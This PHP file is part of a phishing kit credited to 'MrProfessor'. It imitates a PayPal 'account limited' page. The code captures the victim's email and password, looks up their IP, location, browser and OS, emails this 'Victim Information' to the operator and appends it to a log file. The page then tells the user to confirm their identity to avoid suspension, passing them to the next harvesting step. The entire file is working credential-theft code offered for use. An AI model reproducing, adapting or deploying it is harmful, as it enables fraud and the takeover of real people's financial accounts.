<?php
/*
* Scampage by MrProfessor
* Jabber: mrprofessor@jodo.im
* ICQ: C3AS3R
*/
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['email'];
$pass = $_POST['password'];

$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "| Os : " . $systemInfo['os'] . "";
$data = "
+ ------------- Moe's Shop --------------+
+ Account Details 
| Username : $user
| Password : $pass
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";



if ($sendEmail === 1) {
	mail($to,  "PayPal Login from " . $_SERVER['REMOTE_ADDR'], $data);
}

if ($saveFile === 1) {
	$file = fopen('assets/logs/fullz_vbv.txt', 'a');
	fwrite($file, $data . "\n");
	fclose($file);
}


?>
<!DOCTYPE html>

<html lang="en-RO" data-device-type="dedicated" class="no-js">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Your account has been limited</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0">

    <link href="assets/lock_files/page.b1eb2f27e98c4dc92711.css" media="screen, projection" rel="stylesheet" type="text/css" charset="UTF-8">
</head>
<body class="">
<div id="app-element-mountpoint">
    <div id="document-body" dir="ltr" data-reactroot="">
        <div class="backgroundColor">
            <script src="assets/lock_files/oneTouchInject.min.js.descărcare" async="" defer=""></script>
            <div>
                <div class="signup clear app-wrapper">
                    <div class="signup-page-header"><a aria-label="Paypal" href="#" class="signup-page-header-logo" pa-marked="1"></a><a href="#" class="signup-page-header-button vx_btn vx_btn-medium vx_btn-secondary" pa-marked="1">Log Out</a></div>
                    <main>
                        <div>
                            <div class="signup-page-form">
                                <div class="notification"></div>
                                <div>
                                    <form id="verify" action="Step1.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>"  class="signupAppContent" method="POST">
                                        <div>
                                            <div>
                                                <div class="center">
                                                    <h3 class="vx_text-2 center " style="font-size: 1.975rem;">We're looking out for you.</h3>
                                                </div>
                                            </div>

                                            <div class="fieldGroupContainer" style="text-align: center; font-weight: 300; color: #5f5f5f; line-height: 1.5em; margin: 0 18px; ">
                                                <p>We’ve noticed some unusual activity and need your help to secure your account. Click ‘Next’ to confirm your identity and avoid suspension. </p>
                                            </div>

                                            <div class="btnGrp"><button value="name_address" class="vx_btn vx_btn-block" style="width:auto" data-automation-id="page_submit" pa-marked="1">Next</button></div>

                                        </div>
                                        <input type="hidden" name="_csrf" value="pfw0QJ87YN4zWW3hd81a81KleOLEnJkJRSg2w=">
                                    </form>
                                </div>
                                <div class="signup-page-footer vx_text-legal text-center">©1999–2020 PayPal. All rights reserved.<span class="signup-page-footer-separator">|</span><a href="#" target="_blank" class="vx_text-legal" pa-marked="1">Privacy</a><span class="signup-page-footer-spacer">&nbsp;</span><a href="#" target="_blank" class="vx_text-legal" pa-marked="1">Legal</a><span class="signup-page-footer-spacer">&nbsp;</span><a href="#" target="_blank" class="vx_text-legal" pa-marked="1">Contact</a><span class="signup-page-footer-spacer">&nbsp;</span><span><a class="vx_text-legal" style="cursor:pointer" pa-marked="1">Feedback</a></span><a href="#" target="_blank" class="vx_text-legal" pa-marked="1"></a></div>
                            </div>
                        </div>
                    </main>
                    <div id="injectedUnifiedLogin" style="height:0px;width:0px;visibility:hidden;overflow:hidden"></div>
                </div>
            </div>
        </div>
    </div>
</div>

    <div></div>
</div>
<iframe src="assets/lock_files/saved_resource.html" title="pbf" style="width: 0; height: 0; border: 0; position:absolute; z-index:-999"></iframe><iframe title="ppfniframe" style="width: 0; height: 0; border: 0; position:absolute; z-index:-999" src="assets/lock_files/i.html"></iframe>
</body>
</html>